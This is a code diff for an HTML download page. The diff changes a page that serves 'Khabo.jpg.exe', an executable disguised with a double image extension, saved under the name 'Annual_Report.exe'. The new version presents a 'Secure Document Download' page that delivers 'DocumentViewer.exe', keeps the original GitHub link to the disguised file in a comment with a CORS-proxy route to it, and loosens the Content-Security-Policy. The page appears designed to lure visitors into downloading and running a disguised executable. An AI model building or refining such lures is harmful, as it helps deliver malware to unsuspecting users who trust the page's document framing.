@@ -1,49 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Document Viewer</title>
+    <title>Secure Document Download</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: data: https:; script-src 'self' 'unsafe-inline' https:;">
     <style>
-        /* Your existing styles */
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .download-section { margin: 30px 0; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background: #f9f9f9; }
+        button { padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        .loading { display: none; color: #666; margin-top: 10px; }
     </style>
 </head>
 <body>
+    <h1>Document Download Center</h1>
+    
     <div class="download-section">
-        <button onclick="downloadFromReleases()">Download (GitHub Releases)</button>
-        <button onclick="downloadFromDropbox()">Download (Dropbox)</button>
+        <h2>Download Document Viewer</h2>
+        <p>Click below to download your document viewer application.</p>
+        <button onclick="startDownload()">Download Now</button>
+        <div id="loading" class="loading">Preparing download... Please wait.</div>
     </div>
 
     <script>
-        // Method 1: Using GitHub Releases
-        async function downloadFromReleases() {
-            const url = 'https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe';
-            startDownload(url, 'Annual_Report.exe');
-        }
-
-        // Method 2: Using Dropbox
-        async function downloadFromDropbox() {
-            const url = 'https://www.dropbox.com/s/yourfileid/Khabo.jpg.exe?dl=1';
-            startDownload(url, 'Annual_Report.exe');
-        }
-
-        // Universal download function
-        async function startDownload(url, filename) {
+        async function startDownload() {
+            // OPTION 1: Use a CORS proxy for GitHub (temporary solution)
+            // const githubUrl = 'https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe';
+            // const url = `https://corsproxy.io/?${encodeURIComponent(githubUrl)}`;
+            
+            // OPTION 2: Use a direct file hosting service (recommended)
+            const url = 'https://example.com/path/to/your/file.exe'; // REPLACE WITH YOUR ACTUAL FILE URL
+            
             try {
-                const res = await fetch(url);
-                if (!res.ok) throw new Error(`Server responded with ${res.status}`);
+                document.body.style.cursor = 'wait';
+                document.getElementById('loading').style.display = 'block';
                 
-                const blob = await res.blob();
+                const response = await fetch(url, {
+                    mode: 'cors',
+                    cache: 'no-store'
+                });
+                
+                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
+                
+                const blob = await response.blob();
+                const blobUrl = URL.createObjectURL(blob);
+                
                 const a = document.createElement('a');
-                a.href = URL.createObjectURL(blob);
-                a.download = filename;
+                a.style.display = 'none';
+                a.href = blobUrl;
+                a.download = 'DocumentViewer.exe';
                 document.body.appendChild(a);
                 a.click();
+                
                 setTimeout(() => {
                     document.body.removeChild(a);
-                    URL.revokeObjectURL(a.href);
+                    URL.revokeObjectURL(blobUrl);
+                    document.getElementById('loading').style.display = 'none';
+                    document.body.style.cursor = 'default';
+                    alert('Download completed successfully!');
                 }, 100);
-                alert('Download started!');
-            } catch (e) {
-                alert('Failed to download: ' + e.message);
+                
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                document.body.style.cursor = 'default';
+                alert(`Download failed: ${error.message}\n\nPlease try again later or contact support.`);
+                console.error('Download error:', error);
             }
         }
     </script>
